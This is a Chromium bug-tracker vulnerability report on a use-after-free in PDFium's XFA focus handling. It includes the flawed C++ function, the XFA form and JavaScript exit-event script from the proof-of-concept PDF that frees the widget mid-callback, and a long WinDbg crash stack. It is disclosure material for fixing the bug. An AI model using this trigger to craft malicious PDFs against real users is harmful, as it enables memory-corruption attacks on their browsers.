# Security: PDFium (XFA) Use-after-free in CXFA_FFWidget::OnKillFocus

| Field | Value |
|-------|-------|
| **Issue ID** | [40095935](https://issues.chromium.org/issues/40095935) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>Plugins>PDF |
| **Platforms** | Linux, Mac, Windows, ChromeOS |
| **Reporter** | hu...@gmail.com |
| **Assignee** | ts...@chromium.org |
| **Created** | 2019-08-08 |
| **Bounty** | $7,500.00 |

## Description

**VULNERABILITY DETAILS**  

CXFA\_FFWidget object use-after-free in function CXFA\_FFWidget::OnKillFocus

**VERSION**  

Operating System: Windows 10 64bit  

Chrome with enabled XFA PDFium

**REPRODUCTION CASE**  

Open file `poc.pdf` in chrome.exe

DETAIL INFORMATION

This issue is related to <https://crbug.com/chromium/949032> and a patch <https://pdfium-review.googlesource.com/c/pdfium/+/57190>. The issue is fixed by this patch but it's not complete. There is a way that can be used to trigger another use-after-free bug in this function.

Let's see the patched version of function CXFA\_FFWidget::OnKillFocus

```
bool CXFA_FFWidget::OnKillFocus(CXFA_FFWidget\* pNewWidget) {  
  // OnKillFocus event may remove this widget.  
  ObservedPtr<CXFA_FFWidget> pWatched(this);  
  GetLayoutItem()->ClearStatusBits(XFA_WidgetStatus_Focused);  
  EventKillFocus();  
  if (!pWatched)  
    return false;  
  
  if (!pNewWidget)  
    return true;  
  
  CXFA_FFWidget\* pParent = GetFFWidget(ToContentLayoutItem(GetParent()));  
  if (pParent && !pParent->IsAncestorOf(pNewWidget)) {  
    if (!pParent->OnKillFocus(pNewWidget))  
      return false;  
  }  
  if (!pWatched)  
    return false;  
  
  return true;  
}  

```

A ObservedPtr is used to watch `this` widget object but the `pNewWidget` object is not watched. The program only checks the exist of `this` after JS callback but not `pNewWidget`. I can trigger the case that `pNewWidget` is freed but `this` object is not destroy.

In poc file, I create a `subform` (name `field4`) with a sub-field name `field5`

```
<subform name="field4" x="5mm" y="5mm">  
  <occur max="-1"/>  
  <field name="field5" w="64.77mm" h="6.35mm">  
    <ui>  
      <textEdit>  
      </textEdit>  
    </ui>  
  </field>  
</subform>  

```

And a `field` name `field3` with an `exit` event handler

```
<field name="field3" h="10.625mm" w="30.625mm" x="5mm" y="50mm">  
    <ui>  
        <numericEdit>  
        </numericEdit>  
    </ui>  
    <event activity="exit">  
        <script contentType="application/x-javascript">  
            f3_exit += 1;  
            if (f3_exit == 1)  
            {  
                f1 = xfa.resolveNode("xfa.form..field1");  
                xfa.host.setFocus(f1);  
                f4 = xfa.resolveNode("xfa.form..field4");  
                f4.instanceManager.addInstance(1);  
                f4.instanceManager.removeInstance(0);  
                xfa.host.openList(f1);  
            }  
        </script>  
    </event>  
</field>  

```

This JS event handler is called when program runs to instruction `EventKillFocus();` in function `CXFA_FFWidget::OnKillFocus`. The JS instruction `f4.instanceManager.removeInstance(0);` will free the `pNewWidget` object but not `this` object => lead to use-after-free bug!

CRASH INFORMATION

```
First chance exceptions are reported before any exception handling.  
This exception may be expected and handled.  
\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\out\chromium_pdfium_xfa\pdfium.dll  
eax=4125cfbc ebx=41002fd8 ecx=4125cfbc edx=0af90001 esi=00efc484 edi=2c356f98  
eip=2ef3716a esp=00efc164 ebp=00efc168 iopl=0         nv up ei pl nz na po nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202  
pdfium!fxcrt::UnownedPtr<CXFA_Node>::Get+0xa:  
2ef3716a 8b00            mov     eax,dword ptr [eax]  ds:002b:4125cfbc=????????  
\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\out\chromium_pdfium_xfa\v8.dll  
  
2:031> kp  
 # ChildEBP RetAddr    
00 00efc168 2ef34564 pdfium!fxcrt::UnownedPtr<CXFA_Node>::Get(void)+0xa [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\core\fxcrt\unowned_ptr.h @ 91]   
01 00efc174 2f1024fd pdfium!CXFA_FFWidget::GetNode(void)+0x14 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_ffwidget.h @ 132]   
02 00efc194 2f102624 pdfium!CXFA_FFWidget::IsAncestorOf(class CXFA_FFWidget \* pWidget = 0x4125cfa0)+0x2d [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_ffwidget.cpp @ 611]   
03 00efc1d0 2f0ff838 pdfium!CXFA_FFWidget::OnKillFocus(class CXFA_FFWidget \* pNewWidget = 0x4125cfa0)+0xc4 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_ffwidget.cpp @ 431]   
04 00efc218 2f0d9bf1 pdfium!CXFA_FFTextEdit::OnKillFocus(class CXFA_FFWidget \* pNewWidget = 0x4125cfa0)+0xb8 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_fftextedit.cpp @ 187]   
05 00efc274 2f0d8bd5 pdfium!CXFA_FFDocView::SetFocus(class CXFA_FFWidget \* pNewFocus = 0x4125cfa0)+0x101 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_ffdocview.cpp @ 288]   
06 00efc298 2f0e9bfe pdfium!CXFA_FFDocView::SetFocusNode(class CXFA_Node \* node = 0x4acbef80)+0x45 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_ffdocview.cpp @ 316]   
07 00efc2b0 2f090483 pdfium!CXFA_FFNotify::SetFocusWidgetNode(class CXFA_Node \* pNode = 0x4acbef80)+0x3e [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_ffnotify.cpp @ 302]   
08 00efc364 2f08e35e pdfium!CJX_HostPseudoModel::setFocus(class CFX_V8 \* runtime = 0x2c356f98, class std::__1::vector<v8::Local<v8::Value>,std::__1::allocator<v8::Local<v8::Value> > > \* params = 0x00efc484 { size=1 })+0x373 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\xfa\cjx_hostpseudomodel.cpp @ 462]   
09 00efc39c 2f09d9e3 pdfium!CJX_HostPseudoModel::setFocus_static(class CJX_Object \* node = 0x41002fd8, class CFX_V8 \* runtime = 0x2c356f98, class std::__1::vector<v8::Local<v8::Value>,std::__1::allocator<v8::Local<v8::Value> > > \* params = 0x00efc484 { size=1 })+0x7e [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\xfa\cjx_hostpseudomodel.h @ 39]   
0a 00efc3f4 2f04788e pdfium!CJX_Object::RunMethod(class fxcrt::WideString \* func = 0x00efc5f4, class std::__1::vector<v8::Local<v8::Value>,std::__1::allocator<v8::Local<v8::Value> > > \* params = 0x00efc484 { size=1 })+0x103 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\xfa\cjx_object.cpp @ 179]   
0b 00efc4a4 2f0418c2 pdfium!CFXJSE_Engine::NormalMethodCall(class v8::FunctionCallbackInfo<v8::Value> \* info = 0x00efc660, class fxcrt::WideString \* functionName = 0x00efc5f4)+0x20e [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\xfa\cfxjse_engine.cpp @ 459]   
0c 00efc644 1fb9b0a3 pdfium!`anonymous namespace'::DynPropGetterAdapter_MethodCallback(class v8::FunctionCallbackInfo<v8::Value> \* info = 0x00efc660)+0x3c2 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\xfa\cfxjse_class.cpp @ 111]   
0d 00efc6b4 1fb99bd8 v8!v8::internal::FunctionCallbackArguments::Call(class v8::internal::CallHandlerInfo handler = class v8::internal::CallHandlerInfo)+0x253 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\api\api-arguments-inl.h @ 158]   
0e 00efc720 1fb98426 v8!v8::internal::`anonymous namespace'::HandleApiCallHelper<0>(class v8::internal::Isolate \* isolate = <Value unavailable error>, class v8::internal::Handle<v8::internal::HeapObject> function = class v8::internal::Handle<v8::internal::HeapObject>, class v8::internal::Handle<v8::internal::HeapObject> new_target = class v8::internal::Handle<v8::internal::HeapObject>, class v8::internal::Handle<v8::internal::FunctionTemplateInfo> fun_data = class v8::internal::Handle<v8::internal::FunctionTemplateInfo>, class v8::internal::Handle<v8::internal::Object> receiver = class v8::internal::Handle<v8::internal::Object>, class v8::internal::BuiltinArguments args = class v8::internal::BuiltinArguments)+0x308 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\builtins\builtins-api.cc @ 113]   
0f 00efc770 1fb97ff2 v8!v8::internal::Builtin_Impl_HandleApiCall(class v8::internal::BuiltinArguments args = class v8::internal::BuiltinArguments, class v8::internal::Isolate \* isolate = 0x42f04af8)+0x166 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\builtins\builtins-api.cc @ 141]   
10 00efc7e8 20933ac3 v8!v8::internal::Builtin_HandleApiCall(int args_length = 0n6, unsigned int \* args_object = 0x00efc820, class v8::internal::Isolate \* isolate = 0x42f04af8)+0x72 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\builtins\builtins-api.cc @ 129]   
11 00efc804 20720ddc v8!Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_BuiltinExit+0x43  
12 00efc844 2070d1fc v8!Builtins_InterpreterEntryTrampoline+0x31c  
13 00efc860 20720ddc v8!Builtins_ArgumentsAdaptorTrampoline+0xbc  
14 00efc8a8 2070d1fc v8!Builtins_InterpreterEntryTrampoline+0x31c  
15 00efc8c4 2071895f v8!Builtins_ArgumentsAdaptorTrampoline+0xbc  
16 00efc8dc 2071877b v8!Builtins_JSEntryTrampoline+0x5f  
17 00efc908 1fcc97a4 v8!Builtins_JSEntry+0x5b  
18 (Inline) -------- v8!v8::internal::GeneratedCode<unsigned int,unsigned int,unsigned int,unsigned int,unsigned int,int,unsigned int \*\*>::Call+0xf [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\execution\simulator.h @ 138]   
19 00efc9c4 1fcc8f8e v8!v8::internal::`anonymous namespace'::Invoke(class v8::internal::Isolate \* isolate = <Value unavailable error>, struct v8::internal::`anonymous namespace'::InvokeParams \* params = 0x00efc9d0)+0x804 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\execution\execution.cc @ 266]   
1a 00efca08 1faf39fb v8!v8::internal::Execution::Call(class v8::internal::Isolate \* isolate = 0x42f04af8, class v8::internal::Handle<v8::internal::Object> callable = class v8::internal::Handle<v8::internal::Object>, class v8::internal::Handle<v8::internal::Object> receiver = class v8::internal::Handle<v8::internal::Object>, int argc = 0n1, class v8::internal::Handle<v8::internal::Object> \* argv = 0x00efcdf8)+0x6e [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\execution\execution.cc @ 358]   
1b 00efcabc 2f04411d v8!v8::Function::Call(class v8::Local<v8::Context> context = class v8::Local<v8::Context>, class v8::Local<v8::Value> recv = class v8::Local<v8::Value>, int argc = 0n1, class v8::Local<v8::Value> \* argv = 0x00efcdf8)+0x2fb [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\api\api.cc @ 4822]   
1c 00efce0c 2f049569 pdfium!CFXJSE_Context::ExecuteScript(char \* szScript = 0x443cc01c ".    xfa_log_print("|form1| docReady: BEGIN");..    f_row_exit = 0;.    .    f3 = xfa.resolveNode("xfa.form..field3");.    xfa_log_print("xfa.host.setFocus(f3);");.    xfa.host.setFocus(f3);..    f_description = xfa.resolveNode("xfa.form..expenseRow1.description");.    xfa_log_print("xfa.host.setFocus(f_description);");.    xfa.host.setFocus(f_description);.    .    xfa_log_print("|form1| docReady: END")    .", class CFXJSE_Value \* lpRetValue = 0x41ca6ff0, class CFXJSE_Value \* lpNewThisObject = 0x407c2ff0)+0xa0d [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\xfa\cfxjse_context.cpp @ 300]   
1d 00efceec 2f17bace pdfium!CFXJSE_Engine::RunScript(CXFA_Script::Type eScriptType = Javascript (0n1), class fxcrt::StringViewTemplate<wchar_t> wsScript = class fxcrt::StringViewTemplate<wchar_t>, class CFXJSE_Value \* hRetValue = 0x41ca6ff0, class CXFA_Object \* pThisObject = 0x49ccaf80)+0x349 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\xfa\cfxjse_engine.cpp @ 153]   
1e 00efcffc 2f179992 pdfium!CXFA_Node::ExecuteBoolScript(class CXFA_FFDocView \* pDocView = 0x3cd2cf60, class CXFA_Script \* script = 0x40494f80, class CXFA_EventParam \* pEventParam = 0x00efd170)+0x33e [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\parser\cxfa_node.cpp @ 2700]   
1f 00efd044 2f1798e5 pdfium!CXFA_Node::ExecuteScript(class CXFA_FFDocView \* pDocView = 0x3cd2cf60, class CXFA_Script \* script = 0x40494f80, class CXFA_EventParam \* pEventParam = 0x00efd170)+0x52 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\parser\cxfa_node.cpp @ 2660]   
20 00efd078 2f17948f pdfium!CXFA_Node::ProcessEventInternal(class CXFA_FFDocView \* pDocView = 0x3cd2cf60, XFA_AttributeValue iActivity = DocReady (0n115), class CXFA_Event \* event = 0x404a0f80, class CXFA_EventParam \* pEventParam = 0x00efd170)+0xe5 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\parser\cxfa_node.cpp @ 2360]   
21 00efd0ec 2f0da018 pdfium!CXFA_Node::ProcessEvent(class CXFA_FFDocView \* pDocView = 0x3cd2cf60, XFA_AttributeValue iActivity = DocReady (0n115), class CXFA_EventParam \* pEventParam = 0x00efd170)+0x10f [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\parser\cxfa_node.cpp @ 2336]   
22 00efd120 2f0d815f pdfium!XFA_ProcessEvent(class CXFA_FFDocView \* pDocView = 0x3cd2cf60, class CXFA_Node \* pNode = 0x49ccaf80, class CXFA_EventParam \* pParam = 0x00efd170)+0x1c8 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_ffdocview.cpp @ 365]   
23 00efd1f0 2f0d80ab pdfium!CXFA_FFDocView::ExecEventActivityByDeepFirst(class CXFA_Node \* pFormNode = 0x49ccaf80, XFA_EVENTTYPE eEventType = XFA_EVENT_DocReady (0n3), bool bIsFormReady = false, bool bRecursive = true)+0x28f [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_ffdocview.cpp @ 413]   
24 00efd2c0 2f0d86c3 pdfium!CXFA_FFDocView::ExecEventActivityByDeepFirst(class CXFA_Node \* pFormNode = 0x49b1cf80, XFA_EVENTTYPE eEventType = XFA_EVENT_DocReady (0n3), bool bIsFormReady = false, bool bRecursive = true)+0x1db [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_ffdocview.cpp @ 399]   
25 00efd334 2f0bd4c8 pdfium!CXFA_FFDocView::StopLayout(void)+0x1a3 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_ffdocview.cpp @ 131]   
26 00efd384 2ef6b9c2 pdfium!CPDFXFA_Context::LoadXFADoc(void)+0x1d8 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fpdfsdk\fpdfxfa\cpdfxfa_context.cpp @ 131]   
\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\out\chromium_pdfium_xfa\chrome.dll  
27 00efd3a4 1a8ddd2e pdfium!FPDF_LoadXFA(struct fpdf_document_t__ \* document = 0x400f0f90)+0x52 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fpdfsdk\fpdf_view.cpp @ 260]   
28 00efd480 1a8cfb2b chrome!chrome_pdf::PDFiumEngine::LoadForm(void)+0x18e [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\pdf\pdfium\pdfium_engine.cc @ 2503]   
29 00efd5f8 1a8dd019 chrome!chrome_pdf::PDFiumEngine::LoadBody(void)+0x19b [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\pdf\pdfium\pdfium_engine.cc @ 2469]   
2a 00efd65c 1a8cf90c chrome!chrome_pdf::PDFiumEngine::ContinueLoadingDocument(class std::__1::basic_string<char,std::__1::char_traits<char>,std::__1::allocator<char> > \* password = 0x00efd694 "")+0x189 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\pdf\pdfium\pdfium_engine.cc @ 2370]   
2b 00efd6b8 1a8cffe8 chrome!chrome_pdf::PDFiumEngine::LoadDocument(void)+0x11c [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\pdf\pdfium\pdfium_engine.cc @ 2294]   
2c 00efd790 1b93bb4e chrome!chrome_pdf::PDFiumEngine::OnDocumentComplete(void)+0x178 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\pdf\pdfium\pdfium_engine.cc @ 685]   
2d 00efd7cc 1b93bc39 chrome!chrome_pdf::DocumentLoaderImpl::ReadComplete(void)+0x12e [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\pdf\document_loader_impl.cc @ 405]   
2e 00efd8b8 1b93d380 chrome!chrome_pdf::DocumentLoaderImpl::DidRead(int result = 0n0)+0x89 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\pdf\document_loader_impl.cc @ 316]   
2f 00efd8d0 1b93d2df chrome!pp::CompletionCallbackFactory<chrome_pdf::DocumentLoaderImpl,pp::ThreadSafeThreadTraits>::Dispatcher0<void (class chrome_pdf::DocumentLoaderImpl \* object = 0x44844f80, int result = 0n0)+0x30 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\utility\completion_callback_factory.h @ 607]   
30 00efd8f4 1908b53b chrome!pp::CompletionCallbackFactory<chrome_pdf::DocumentLoaderImpl,pp::ThreadSafeThreadTraits>::CallbackData<pp::CompletionCallbackFactory<chrome_pdf::DocumentLoaderImpl,pp::ThreadSafeThreadTraits>::Dispatcher0<void (void \* user_data = 0x3ff36ff0, int result = 0n0)+0x3f [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\utility\completion_callback_factory.h @ 584]   
31 00efd914 1b9386a3 chrome!PP_RunCompletionCallback(struct PP_CompletionCallback \* cc = 0x00efd938, int result = 0n0)+0x2b [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\c\pp_completion_callback.h @ 241]   
32 00efd94c 1b93679e chrome!PP_RunAndClearCompletionCallback(struct PP_CompletionCallback \* cc = 0x3eb34f74, int res = 0n0)+0x63 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\c\pp_completion_callback.h @ 282]   
33 00efd968 1b9372ab chrome!pp::CompletionCallback::RunAndClear(int result = 0n0)+0x4e [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\cpp\completion_callback.h @ 100]   
34 00efda88 1b938ba0 chrome!chrome_pdf::URLLoaderWrapperImpl::DidRead(int result = 0n0)+0x7b [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\pdf\url_loader_wrapper_impl.cc @ 272]   
35 00efdaa0 1b938aff chrome!pp::CompletionCallbackFactory<chrome_pdf::URLLoaderWrapperImpl,pp::ThreadSafeThreadTraits>::Dispatcher0<void (class chrome_pdf::URLLoaderWrapperImpl \* object = 0x3eb34f08, int result = 0n0)+0x30 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\utility\completion_callback_factory.h @ 607]   
\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\out\chromium_pdfium_xfa\ppapi_shared.dll  
36 00efdac4 527c4e1b chrome!pp::CompletionCallbackFactory<chrome_pdf::URLLoaderWrapperImpl,pp::ThreadSafeThreadTraits>::CallbackData<pp::CompletionCallbackFactory<chrome_pdf::URLLoaderWrapperImpl,pp::ThreadSafeThreadTraits>::Dispatcher0<void (void \* user_data = 0x3ffd0ff0, int result = 0n0)+0x3f [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\utility\completion_callback_factory.h @ 584]   
37 00efdae4 527c4dc7 ppapi_shared!PP_RunCompletionCallback(struct PP_CompletionCallback \* cc = 0x3fffafe0, int result = 0n0)+0x2b [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\c\pp_completion_callback.h @ 241]   
38 00efdb10 527c42ec ppapi_shared!ppapi::CallWhileUnlocked<void,PP_CompletionCallback \*,int,PP_CompletionCallback \*,int>(<function> \* function = 0x527c4df0, struct PP_CompletionCallback \*\* p1 = 0x00efdb58, int \* p2 = 0x00efdb78)+0x47 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\shared_impl\proxy_lock.h @ 136]   
\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\out\chromium_pdfium_xfa\ppapi_proxy.dll  
39 00efdb70 2e92691b ppapi_shared!ppapi::TrackedCallback::Run(int result = 0n0)+0x1bc [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\shared_impl\tracked_callback.cc @ 141]   
3a 00efdc44 2e926557 ppapi_proxy!ppapi::proxy::URLLoaderResource::RunCallback(int result = 0n0)+0x12b [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\proxy\url_loader_resource.cc @ 336]   
3b 00efdc68 2e928cf9 ppapi_proxy!ppapi::proxy::URLLoaderResource::OnPluginMsgFinishedLoading(class ppapi::proxy::ResourceMessageReplyParams \* params = 0x3ff3cfa0, int result = 0n0)+0x77 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\proxy\url_loader_resource.cc @ 282]   
3c 00efdca4 2e9264c2 ppapi_proxy!ppapi::proxy::DispatchResourceReplyImpl<ppapi::proxy::URLLoaderResource,void (class ppapi::proxy::URLLoaderResource \* obj = 0x3e8f0ee8, <function> \* method = 0x2e9264e0, class ppapi::proxy::ResourceMessageReplyParams \* params = 0x3ff3cfa0, class std::__1::tuple<int> \* args_tuple = 0x00efdec4)+0x69 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\proxy\dispatch_reply_message.h @ 34]   
3d 00efdcf8 2e925d49 ppapi_proxy!ppapi::proxy::DispatchResourceReply<ppapi::proxy::URLLoaderResource,void (class ppapi::proxy::URLLoaderResource \* obj = 0x3e8f0ee8, <function> \* method = 0x2e9264e0, class ppapi::proxy::ResourceMessageReplyParams \* params = 0x3ff3cfa0, class std::__1::tuple<int> \* args_tuple = 0x00efdec4)+0x82 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\proxy\dispatch_reply_message.h @ 46]   
3e 00efdfb8 2e886b83 ppapi_proxy!ppapi::proxy::URLLoaderResource::OnReplyReceived(class ppapi::proxy::ResourceMessageReplyParams \* params = 0x3ff3cfa0, class IPC::Message \* \*\*\* WARNING: Unable to verify checksum for C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\out\chromium_pdfium_xfa\message_support.dll  
msg = 0x3ff3cfb8 {size = 0x50})+0x209 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\proxy\url_loader_resource.cc @ 220]   
3f 00efe0a4 2e888ec1 ppapi_proxy!ppapi::proxy::PluginMessageFilter::DispatchResourceReply(class ppapi::proxy::ResourceMessageReplyParams \* reply_params = 0x3ff3cfa0, class IPC::Message \* nested_msg = 0x3ff3cfb8 {size = 0x50})+0x173 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\proxy\plugin_message_filter.cc @ 116]   
40 00efe0cc 2e888e06 ppapi_proxy!base::internal::FunctorTraits<void (<function> \*\* function = 0x3ff3cf9c, class ppapi::proxy::ResourceMessageReplyParams \* args = 0x3ff3cfa0, class IPC::Message \* args = 0x3ff3cfb8 {size = 0x50})+0x51 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\bind_internal.h @ 399]   
41 00efe0f8 2e888d7f ppapi_proxy!base::internal::InvokeHelper<0,void>::MakeItSo<void (<function> \*\* functor = 0x3ff3cf9c, class ppapi::proxy::ResourceMessageReplyParams \* args = 0x3ff3cfa0, class IPC::Message \* args = 0x3ff3cfb8 {size = 0x50})+0x56 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\bind_internal.h @ 599]   
42 00efe11c 2e888c34 ppapi_proxy!base::internal::Invoker<base::internal::BindState<void (<function> \*\* functor = 0x3ff3cf9c, class std::__1::tuple<ppapi::proxy::ResourceMessageReplyParams,IPC::Message> \* bound = 0x3ff3cfa0)+0x6f [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\bind_internal.h @ 672]   
\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\out\chromium_pdfium_xfa\base.dll  
43 00efe144 66931bb0 ppapi_proxy!base::internal::Invoker<base::internal::BindState<void (class base::internal::BindStateBase \* base = 0x3ff3cf88)+0x54 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\bind_internal.h @ 641]   
44 00efe168 66b09963 base!base::OnceCallback<void (void)+0x50 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\callback.h @ 99]   
45 00efe3f0 66b60ed5 base!base::TaskAnnotator::RunTask(char \* trace_event_name = 0x66cf321c "SequenceManager RunTask", struct base::PendingTask \* pending_task = 0x00efe738)+0x5b3 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\task\common\task_annotator.cc @ 144]   
46 00efe7a8 66b60501 base!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(class base::sequence_manager::LazyNow \* continuation_lazy_now = 0x00efe848, bool \* ran_task = 0x00efe863)+0x735 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc @ 365]   
47 00efe870 669f2300 base!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoSomeWork(void)+0xb1 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc @ 218]   
48 00efe8d0 66b6230c base!base::MessagePumpDefault::Run(class base::MessagePump::Delegate \* delegate = 0x3ec08f2c)+0x60 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\message_loop\message_pump_default.cc @ 39]   
49 00efeb64 66a9b535 base!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool application_tasks_allowed = true, class base::TimeDelta timeout = 9223372036854775807)+0x34c [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc @ 463]   
4a 00efed68 66a9b1e5 base!base::RunLoop::RunWithTimeout(class base::TimeDelta timeout = 9223372036854775807)+0x335 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\run_loop.cc @ 160]   
\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\out\chromium_pdfium_xfa\content.dll  
4b 00efed94 5bea5a9a base!base::RunLoop::Run(void)+0x45 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\run_loop.cc @ 135]   
4c 00efef80 5fbdaeb6 content!content::PpapiPluginMain(struct content::MainFunctionParams \* parameters = 0x00efeff4)+0x5ca [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\content\ppapi_plugin\ppapi_plugin_main.cc @ 160]   
4d 00efefac 5fbdbf05 content!content::RunOtherNamedProcessTypeMain(class std::__1::basic_string<char,std::__1::char_traits<char>,std::__1::allocator<char> > \* process_type = 0x00eff010 "ppapi", struct content::MainFunctionParams \* main_function_params = 0x00efeff4, class content::ContentMainDelegate \* delegate = 0x00eff5e4)+0xa6 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\content\app\content_main_runner_impl.cc @ 578]   
4e 00eff168 5fbd77f0 content!content::ContentMainRunnerImpl::Run(bool start_service_manager_only = false)+0x2c5 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\content\app\content_main_runner_impl.cc @ 871]   
